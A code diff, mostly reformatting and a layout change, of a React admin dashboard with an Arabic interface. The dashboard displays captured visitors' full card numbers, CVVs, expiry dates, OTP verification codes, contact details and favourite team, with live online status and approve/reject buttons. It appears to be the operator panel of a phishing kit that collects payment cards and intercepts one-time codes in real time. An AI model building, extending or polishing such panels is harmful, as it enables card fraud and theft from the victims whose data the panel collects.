@@ -1,13 +1,13 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { 
-  RefreshCw, 
-  LogOut, 
-  CreditCard, 
-  User, 
-  Clock, 
-  MapPin, 
-  Phone, 
+import {
+  RefreshCw,
+  LogOut,
+  CreditCard,
+  User,
+  Clock,
+  MapPin,
+  Phone,
   Mail,
   Check,
   X,
@@ -15,7 +15,7 @@ import {
   Inbox,
   Circle,
   EyeOff,
-  Eye
+  Eye,
 } from "lucide-react";
 import {
   subscribeToVisitors,
@@ -63,10 +63,10 @@ const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
   try {
     const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
     if (bin.length < 6) return null;
-    
+
     const response = await fetch(`https://lookup.binlist.net/${bin}`);
     if (!response.ok) return null;
-    
+
     const data = await response.json();
     return data;
   } catch (error) {
@@ -75,15 +75,25 @@ const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
   }
 };
 
-function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<string, any>; binInfo: BinInfo | null }) {
+function CreditCardDisplay({
+  paymentInfo,
+  binInfo,
+}: {
+  paymentInfo: Record<string, any>;
+  binInfo: BinInfo | null;
+}) {
   const cardNumber = paymentInfo.cardLast4 || "";
-  const formattedNumber = cardNumber.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();
-  
+  const formattedNumber = cardNumber
+    .replace(/\s/g, "")
+    .replace(/(.{4})/g, "$1 ")
+    .trim();
+
   const getCardSchemeColor = () => {
     const scheme = binInfo?.scheme?.toLowerCase();
     if (scheme === "visa") return "from-blue-600 to-blue-800";
     if (scheme === "mastercard") return "from-red-500 to-orange-500";
-    if (scheme === "amex" || scheme === "american express") return "from-gray-600 to-gray-800";
+    if (scheme === "amex" || scheme === "american express")
+      return "from-gray-600 to-gray-800";
     return "from-slate-700 to-slate-900";
   };
 
@@ -91,7 +101,9 @@ function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<strin
     const scheme = binInfo?.scheme?.toLowerCase();
     if (scheme === "visa") {
       return (
-        <div className="text-white font-bold text-xl italic tracking-wider">VISA</div>
+        <div className="text-white font-bold text-xl italic tracking-wider">
+          VISA
+        </div>
       );
     }
     if (scheme === "mastercard") {
@@ -106,13 +118,17 @@ function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<strin
   };
 
   return (
-    <div className={`w-full rounded-xl p-5 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-lg relative overflow-hidden`}>
+    <div
+      className={`w-full rounded-xl p-5 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-lg relative overflow-hidden`}
+    >
       <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2"></div>
-      
+
       <div className="flex items-start justify-between mb-6 relative z-10">
         <div>
           {binInfo?.bank?.name && (
-            <div className="text-white/90 text-sm font-medium">{binInfo.bank.name}</div>
+            <div className="text-white/90 text-sm font-medium">
+              {binInfo.bank.name}
+            </div>
           )}
           {binInfo?.country?.name && (
             <div className="text-white/60 text-xs">{binInfo.country.name}</div>
@@ -134,26 +150,32 @@ function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<strin
             {paymentInfo.cardholderName || "N/A"}
           </div>
         </div>
-        
+
         <div className="flex gap-4 items-end">
           <div className="text-center">
             <div className="text-white/60 text-xs mb-1">EXP</div>
-            <div className="font-mono text-sm">{paymentInfo.expiryDate || "MM/YY"}</div>
+            <div className="font-mono text-sm">
+              {paymentInfo.expiryDate || "MM/YY"}
+            </div>
           </div>
-          
+
           <div className="text-center">
             <div className="text-white/60 text-xs mb-1">CVV</div>
-            <div className="font-mono text-sm font-bold">{paymentInfo.cvv || "•••"}</div>
+            <div className="font-mono text-sm font-bold">
+              {paymentInfo.cvv || "•••"}
+            </div>
           </div>
         </div>
       </div>
 
       <div className="flex items-center gap-2 mt-4 pt-3 border-t border-white/20 relative z-10">
-        <span className={`px-2 py-0.5 rounded text-xs font-medium ${
-          binInfo?.type?.toLowerCase() === "debit" 
-            ? "bg-green-500/30 text-green-100" 
-            : "bg-purple-500/30 text-purple-100"
-        }`}>
+        <span
+          className={`px-2 py-0.5 rounded text-xs font-medium ${
+            binInfo?.type?.toLowerCase() === "debit"
+              ? "bg-green-500/30 text-green-100"
+              : "bg-purple-500/30 text-purple-100"
+          }`}
+        >
           {binInfo?.type?.toUpperCase() || "CARD"}
         </span>
         {binInfo?.brand && (
@@ -230,7 +252,7 @@ export default function AdminDashboard() {
       month: "short",
       day: "numeric",
       hour: "2-digit",
-      minute: "2-digit"
+      minute: "2-digit",
     });
   };
 
@@ -263,11 +285,15 @@ export default function AdminDashboard() {
     };
   });
 
-  const filteredData = combinedData.filter(row => row.paymentInfo && (showHidden || !hiddenIds.has(row.visitorId)));
-  const hiddenCount = combinedData.filter(row => row.paymentInfo && hiddenIds.has(row.visitorId)).length;
+  const filteredData = combinedData.filter(
+    (row) => row.paymentInfo && (showHidden || !hiddenIds.has(row.visitorId)),
+  );
+  const hiddenCount = combinedData.filter(
+    (row) => row.paymentInfo && hiddenIds.has(row.visitorId),
+  ).length;
 
   const handleHideEntry = (visitorId: string) => {
-    setHiddenIds(prev => {
+    setHiddenIds((prev) => {
       const newSet = new Set(prev);
       if (newSet.has(visitorId)) {
         newSet.delete(visitorId);
@@ -284,7 +310,7 @@ export default function AdminDashboard() {
   const handleSelectEntry = async (data: CombinedData) => {
     setSelectedData(data);
     setBinInfo(null);
-    
+
     if (data.paymentInfo?.cardLast4) {
       setLoadingBin(true);
       const info = await lookupBin(data.paymentInfo.cardLast4);
@@ -316,11 +342,15 @@ export default function AdminDashboard() {
             <Inbox className="w-5 h-5 text-white" />
           </div>
           <div>
-            <h1 className="text-lg font-semibold text-slate-800">لوحة التحكم</h1>
-            <p className="text-xs text-slate-500">{filteredData.length} رسالة</p>
+            <h1 className="text-lg font-semibold text-slate-800">
+              لوحة التحكم
+            </h1>
+            <p className="text-xs text-slate-500">
+              {filteredData.length} رسالة
+            </p>
           </div>
         </div>
-        
+
         <div className="flex items-center gap-2">
           {hiddenCount > 0 && (
             <Button
@@ -330,12 +360,16 @@ export default function AdminDashboard() {
               className="text-xs"
             >
               <EyeOff className="w-3.5 h-3.5 ml-1" />
-              {showHidden ? `إخفاء (${hiddenCount})` : `المخفية (${hiddenCount})`}
+              {showHidden
+                ? `إخفاء (${hiddenCount})`
+                : `المخفية (${hiddenCount})`}
             </Button>
           )}
           <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 rounded-full">
             <Circle className="w-2 h-2 fill-green-500 text-green-500" />
-            <span className="text-xs font-medium text-green-700">{onlineCount} متصل</span>
+            <span className="text-xs font-medium text-green-700">
+              {onlineCount} متصل
+            </span>
           </div>
           <Button
             onClick={handleLogout}
@@ -365,10 +399,14 @@ export default function AdminDashboard() {
                     data-testid={`inbox-item-${row.visitorId}`}
                   >
                     <div className="flex items-start gap-3">
-                      <div className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${
-                        row.isOnline ? "bg-green-100" : "bg-slate-100"
-                      }`}>
-                        <User className={`w-5 h-5 ${row.isOnline ? "text-green-600" : "text-slate-400"}`} />
+                      <div
+                        className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${
+                          row.isOnline ? "bg-green-100" : "bg-slate-100"
+                        }`}
+                      >
+                        <User
+                          className={`w-5 h-5 ${row.isOnline ? "text-green-600" : "text-slate-400"}`}
+                        />
                       </div>
                       <div className="flex-1 min-w-0">
                         <div className="flex items-center justify-between gap-2 mb-1">
@@ -390,11 +428,13 @@ export default function AdminDashboard() {
                               OTP: {row.code}
                             </span>
                           )}
-                          <span className={`text-xs px-1.5 py-0.5 rounded ${
-                            row.isOnline
-                              ? "bg-green-50 text-green-600"
-                              : "bg-slate-100 text-slate-500"
-                          }`}>
+                          <span
+                            className={`text-xs px-1.5 py-0.5 rounded ${
+                              row.isOnline
+                                ? "bg-green-50 text-green-600"
+                                : "bg-slate-100 text-slate-500"
+                            }`}
+                          >
                             {row.isOnline ? "متصل" : "غير متصل"}
                           </span>
                         </div>
@@ -418,18 +458,26 @@ export default function AdminDashboard() {
               <div className="bg-white border-b border-slate-200 p-4 shrink-0">
                 <div className="flex items-center justify-between">
                   <div className="flex items-center gap-3">
-                    <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
-                      selectedData.isOnline ? "bg-green-100" : "bg-slate-100"
-                    }`}>
-                      <User className={`w-6 h-6 ${selectedData.isOnline ? "text-green-600" : "text-slate-400"}`} />
+                    <div
+                      className={`w-12 h-12 rounded-full flex items-center justify-center ${
+                        selectedData.isOnline ? "bg-green-100" : "bg-slate-100"
+                      }`}
+                    >
+                      <User
+                        className={`w-6 h-6 ${selectedData.isOnline ? "text-green-600" : "text-slate-400"}`}
+                      />
                     </div>
                     <div>
                       <h2 className="font-semibold text-slate-800">
-                        {selectedData.paymentInfo?.cardholderName || "غير معروف"}
+                        {selectedData.paymentInfo?.cardholderName ||
+                          "غير معروف"}
                       </h2>
                       <div className="flex items-center gap-2 text-sm text-slate-500">
                         <MapPin className="w-3.5 h-3.5" />
-                        <span>{selectedData.country} {selectedData.city && `• ${selectedData.city}`}</span>
+                        <span>
+                          {selectedData.country}{" "}
+                          {selectedData.city && `• ${selectedData.city}`}
+                        </span>
                         <span className="text-slate-300">|</span>
                         <Clock className="w-3.5 h-3.5" />
                         <span>{formatFullTime(selectedData.lastSeen)}</span>
@@ -437,7 +485,11 @@ export default function AdminDashboard() {
                     </div>
                   </div>
                   <div className="flex items-center gap-2">
-                    <Button variant="default" size="sm" className="bg-green-600 hover:bg-green-700">
+                    <Button
+                      variant="default"
+                      size="sm"
+                      className="bg-green-600 hover:bg-green-700"
+                    >
                       <Check className="w-4 h-4 ml-1" />
                       موافقة
                     </Button>
@@ -445,8 +497,8 @@ export default function AdminDashboard() {
                       <X className="w-4 h-4 ml-1" />
                       رفض
                     </Button>
-                    <Button 
-                      variant="outline" 
+                    <Button
+                      variant="outline"
                       size="sm"
                       onClick={() => handleHideEntry(selectedData.visitorId)}
                       className="text-slate-600"
@@ -467,11 +519,13 @@ export default function AdminDashboard() {
                 </div>
               </div>
 
-              <ScrollArea className="flex-1 p-6">
-                <div className="max-w-2xl mx-auto space-y-6">
+              <ScrollArea className="flex-1 p-6 ">
+                <div className=" mx-auto space-y-6 grid grid-cols-2 gap-4">
                   {selectedData.code && (
                     <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center">
-                      <span className="text-sm text-amber-600 block mb-1">رمز التحقق OTP</span>
+                      <span className="text-sm text-amber-600 block mb-1">
+                        رمز التحقق OTP
+                      </span>
                       <span className="font-mono text-3xl font-bold text-amber-700">
                         {selectedData.code}
                       </span>
@@ -482,35 +536,46 @@ export default function AdminDashboard() {
                     <div className="bg-white rounded-xl border border-slate-200 p-5">
                       <div className="flex items-center gap-2 mb-4">
                         <CreditCard className="w-5 h-5 text-slate-600" />
-                        <h3 className="font-semibold text-slate-700">معلومات البطاقة</h3>
+                        <h3 className="font-semibold text-slate-700">
+                          معلومات البطاقة
+                        </h3>
                       </div>
-                      
+
                       {loadingBin ? (
                         <div className="flex items-center justify-center py-8">
                           <RefreshCw className="w-5 h-5 text-slate-400 animate-spin" />
                         </div>
                       ) : (
-                        <CreditCardDisplay 
-                          paymentInfo={selectedData.paymentInfo} 
-                          binInfo={binInfo} 
+                        <CreditCardDisplay
+                          paymentInfo={selectedData.paymentInfo}
+                          binInfo={binInfo}
                         />
                       )}
 
                       <div className="grid grid-cols-3 gap-3 mt-4">
                         <div className="bg-slate-50 rounded-lg p-3 text-center">
-                          <span className="text-xs text-slate-500 block mb-1">رقم البطاقة</span>
-                          <span className="font-mono text-sm font-medium text-slate-700" dir="ltr">
+                          <span className="text-xs text-slate-500 block mb-1">
+                            رقم البطاقة
+                          </span>
+                          <span
+                            className="font-mono text-sm font-medium text-slate-700"
+                            dir="ltr"
+                          >
                             {selectedData.paymentInfo.cardLast4 || "-"}
                           </span>
                         </div>
                         <div className="bg-slate-50 rounded-lg p-3 text-center">
-                          <span className="text-xs text-slate-500 block mb-1">تاريخ الانتهاء</span>
+                          <span className="text-xs text-slate-500 block mb-1">
+                            تاريخ الانتهاء
+                          </span>
                           <span className="font-mono text-sm font-medium text-slate-700">
                             {selectedData.paymentInfo.expiryDate || "-"}
                           </span>
                         </div>
                         <div className="bg-slate-50 rounded-lg p-3 text-center">
-                          <span className="text-xs text-slate-500 block mb-1">CVV</span>
+                          <span className="text-xs text-slate-500 block mb-1">
+                            CVV
+                          </span>
                           <span className="font-mono text-sm font-bold text-slate-700">
                             {selectedData.paymentInfo.cvv || "-"}
                           </span>
@@ -523,58 +588,76 @@ export default function AdminDashboard() {
                     <div className="bg-white rounded-xl border border-slate-200 p-5">
                       <div className="flex items-center gap-2 mb-4">
                         <User className="w-5 h-5 text-slate-600" />
-                        <h3 className="font-semibold text-slate-700">معلومات المشتري</h3>
+                        <h3 className="font-semibold text-slate-700">
+                          معلومات المشتري
+                        </h3>
                       </div>
-                      
+
                       <div className="grid grid-cols-2 gap-4">
                         <div className="space-y-1">
-                          <span className="text-xs text-slate-500">الاسم الكامل</span>
+                          <span className="text-xs text-slate-500">
+                            الاسم الكامل
+                          </span>
                           <p className="text-sm font-medium text-slate-800">
-                            {selectedData.buyerInfo.firstName} {selectedData.buyerInfo.lastName}
+                            {selectedData.buyerInfo.firstName}{" "}
+                            {selectedData.buyerInfo.lastName}
                           </p>
                         </div>
-                        
+
                         {selectedData.buyerInfo.email && (
                           <div className="space-y-1">
-                            <span className="text-xs text-slate-500">البريد الإلكتروني</span>
+                            <span className="text-xs text-slate-500">
+                              البريد الإلكتروني
+                            </span>
                             <p className="text-sm font-medium text-slate-800 flex items-center gap-1">
                               <Mail className="w-3.5 h-3.5 text-slate-400" />
                               {selectedData.buyerInfo.email}
                             </p>
                           </div>
                         )}
-                        
+
                         {selectedData.buyerInfo.phone && (
                           <div className="space-y-1">
-                            <span className="text-xs text-slate-500">رقم الهاتف</span>
-                            <p className="text-sm font-medium text-slate-800 flex items-center gap-1" dir="ltr">
+                            <span className="text-xs text-slate-500">
+                              رقم الهاتف
+                            </span>
+                            <p
+                              className="text-sm font-medium text-slate-800 flex items-center gap-1"
+                              dir="ltr"
+                            >
                               <Phone className="w-3.5 h-3.5 text-slate-400" />
                               {selectedData.buyerInfo.phone}
                             </p>
                           </div>
                         )}
-                        
+
                         {selectedData.buyerInfo.nationality && (
                           <div className="space-y-1">
-                            <span className="text-xs text-slate-500">الجنسية</span>
+                            <span className="text-xs text-slate-500">
+                              الجنسية
+                            </span>
                             <p className="text-sm font-medium text-slate-800">
                               {selectedData.buyerInfo.nationality}
                             </p>
                           </div>
                         )}
-                        
+
                         {selectedData.buyerInfo.gender && (
                           <div className="space-y-1">
-                            <span className="text-xs text-slate-500">الجنس</span>
+                            <span className="text-xs text-slate-500">
+                              الجنس
+                            </span>
                             <p className="text-sm font-medium text-slate-800">
                               {selectedData.buyerInfo.gender}
                             </p>
                           </div>
                         )}
-                        
+
                         {selectedData.buyerInfo.favoriteTeam && (
                           <div className="space-y-1">
-                            <span className="text-xs text-slate-500">الفريق المفضل</span>
+                            <span className="text-xs text-slate-500">
+                              الفريق المفضل
+                            </span>
                             <p className="text-sm font-medium text-slate-800">
                               {selectedData.buyerInfo.favoriteTeam}
                             </p>
@@ -586,23 +669,33 @@ export default function AdminDashboard() {
 
                   {binInfo && (
                     <div className="bg-white rounded-xl border border-slate-200 p-5">
-                      <h3 className="font-semibold text-slate-700 mb-4">معلومات البنك</h3>
+                      <h3 className="font-semibold text-slate-700 mb-4">
+                        معلومات البنك
+                      </h3>
                       <div className="grid grid-cols-2 gap-4 text-sm">
                         <div>
                           <span className="text-slate-500">البنك:</span>
-                          <span className="font-medium text-slate-800 mr-2">{binInfo.bank?.name || "غير معروف"}</span>
+                          <span className="font-medium text-slate-800 mr-2">
+                            {binInfo.bank?.name || "غير معروف"}
+                          </span>
                         </div>
                         <div>
                           <span className="text-slate-500">الدولة:</span>
-                          <span className="font-medium text-slate-800 mr-2">{binInfo.country?.name || "غير معروف"}</span>
+                          <span className="font-medium text-slate-800 mr-2">
+                            {binInfo.country?.name || "غير معروف"}
+                          </span>
                         </div>
                         <div>
                           <span className="text-slate-500">النوع:</span>
-                          <span className="font-medium text-slate-800 mr-2">{binInfo.type || "غير معروف"}</span>
+                          <span className="font-medium text-slate-800 mr-2">
+                            {binInfo.type || "غير معروف"}
+                          </span>
                         </div>
                         <div>
                           <span className="text-slate-500">العملة:</span>
-                          <span className="font-medium text-slate-800 mr-2">{binInfo.country?.currency || "غير معروف"}</span>
+                          <span className="font-medium text-slate-800 mr-2">
+                            {binInfo.country?.currency || "غير معروف"}
+                          </span>
                         </div>
                       </div>
                     </div>
